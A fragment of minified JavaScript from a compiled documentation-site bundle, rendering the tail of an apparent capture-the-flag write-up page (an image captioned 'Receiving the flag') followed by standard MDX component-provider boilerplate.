payload"})})]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (205).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:"Receiving the flag"})})]})]})}function d(e={}){const{wrapper:s}={...(0,a.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(h,{...e})}):h(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>c,x:()=>r});var t=n(6540);const i={},a=t.createContext(i);function c(e){const s=t.useContext(a);return t.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function r(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:c(e.components),t.createElement(a.Provider,{value:s},e.children)}}}]);